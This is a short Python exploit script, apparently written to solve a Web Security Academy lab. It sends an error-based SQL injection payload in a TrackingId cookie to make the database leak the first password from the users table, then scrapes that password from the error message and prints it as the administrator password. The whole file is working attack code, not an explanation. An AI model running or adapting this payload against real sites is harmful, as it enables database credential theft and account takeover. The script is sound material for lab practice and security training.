import sys
import requests
from bs4 import BeautifulSoup


def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <url>")
        print("Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].rstrip('/')
    payload = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
    response = requests.get(url, cookies={"TrackingId": payload})

    # Extracting password from response
    soup = BeautifulSoup(response.text, 'html.parser')
    password = soup.find('p', class_='is-warning').text.split('"')[1]
    print(f"Administrator account password: {password}")


if __name__ == "__main__":
    main()
